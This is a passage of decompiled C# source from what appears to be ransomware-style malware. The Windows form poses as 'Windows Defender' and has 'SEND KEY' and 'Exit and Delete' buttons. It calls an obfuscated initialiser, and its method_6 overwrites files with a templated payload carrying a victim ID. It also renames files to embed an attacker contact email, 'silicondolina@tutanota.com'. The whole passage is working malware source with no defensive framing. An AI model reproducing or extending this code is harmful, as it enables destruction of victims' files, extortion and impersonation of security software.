		((Control)b4).set_Size(new Size(75, 23));
		((Control)b4).set_TabIndex(4);
		((Control)b4).set_Text("Start");
		((ButtonBase)b4).set_UseVisualStyleBackColor(true);
		((Control)b4).add_Click((EventHandler)b4_Click);
		((Control)b3).set_Location(new Point(124, 253));
		((Control)b3).set_Name("b3");
		((Control)b3).set_Size(new Size(75, 31));
		((Control)b3).set_TabIndex(4);
		((Control)b3).set_Text("Start");
		((ButtonBase)b3).set_UseVisualStyleBackColor(true);
		((Control)b3).add_Click((EventHandler)feaywPbmBh);
		((Control)button3).set_Location(new Point(84, 3));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(55, 23));
		((Control)button3).set_TabIndex(5);
		((Control)button3).set_Text("Exit and Delete");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)tskolko).set_AutoSize(true);
		((Control)tskolko).set_Font(new Font("Lucida Console", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)tskolko).set_Location(new Point(145, 7));
		((Control)tskolko).set_Name("tskolko");
		((Control)tskolko).set_Size(new Size(21, 19));
		((Control)tskolko).set_TabIndex(6);
		((Control)tskolko).set_Text("0");
		((Control)tskolko).add_DoubleClick((EventHandler)tskolko_DoubleClick);
		((Control)button1).set_Location(new Point(426, 6));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(59, 23));
		((Control)button1).set_TabIndex(7);
		((Control)button1).set_Text("SEND KEY");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)taidi).set_Location(new Point(2, 29));
		((Control)taidi).set_Name("taidi");
		((Control)taidi).set_Size(new Size(483, 20));
		((Control)taidi).set_TabIndex(8);
		((Control)tkluch).set_Location(new Point(2, 55));
		((Control)tkluch).set_Name("tkluch");
		((Control)tkluch).set_Size(new Size(483, 20));
		((Control)tkluch).set_TabIndex(8);
		((Control)treplacemail).set_Location(new Point(221, 7));
		((Control)treplacemail).set_Name("treplacemail");
		((Control)treplacemail).set_Size(new Size(92, 20));
		((Control)treplacemail).set_TabIndex(9);
		((Control)treplacemail).add_TextChanged((EventHandler)treplacemail_TextChanged);
		((Control)treplacefile).set_Enabled(false);
		((Control)treplacefile).set_Location(new Point(319, 7));
		((Control)treplacefile).set_Name("treplacefile");
		((Control)treplacefile).set_Size(new Size(100, 20));
		((Control)treplacefile).set_TabIndex(10);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(488, 389));
		((Control)this).get_Controls().Add((Control)(object)treplacefile);
		((Control)this).get_Controls().Add((Control)(object)treplacemail);
		((Control)this).get_Controls().Add((Control)(object)tkluch);
		((Control)this).get_Controls().Add((Control)(object)taidi);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)tskolko);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)b3);
		((Control)this).get_Controls().Add((Control)(object)b4);
		((Control)this).get_Controls().Add((Control)(object)b2);
		((Control)this).get_Controls().Add((Control)(object)b1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)t4);
		((Control)this).get_Controls().Add((Control)(object)t3);
		((Control)this).get_Controls().Add((Control)(object)t2);
		((Control)this).get_Controls().Add((Control)(object)t1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Windows Defender");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Form1()
	{
		Class9.T7DkdFQzGSTU8();
		skolko = 0;
		l1 = new List<string>();
		l2 = new List<string>();
		l3 = new List<string>();
		l4 = new List<string>();
		l5 = new List<string>();
		bool_0 = false;
	}

	[CompilerGenerated]
	private void method_6(string string_2)
	{
		try
		{
			try
			{
				_ = Path.GetFileName(string_2)!.ToLower() == ((Control)treplacefile).get_Text().ToLower();
				try
				{
					File.WriteAllText(string_2, Resources.smethod_0().Replace("[zalupaid]", string_1));
					skolko++;
					((Control)tskolko).set_Text(skolko.ToString());
				}
				catch
				{
				}
				if (Path.GetFileName(string_2)!.Contains(((Control)treplacemail).get_Text()))
				{
					try
					{
						File.Move(string_2, string_2.Replace(((Control)treplacemail).get_Text(), "silicondolina@tutanota.com"));
						skolko++;
						((Control)tskolko).set_Text(skolko.ToString());
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}
}
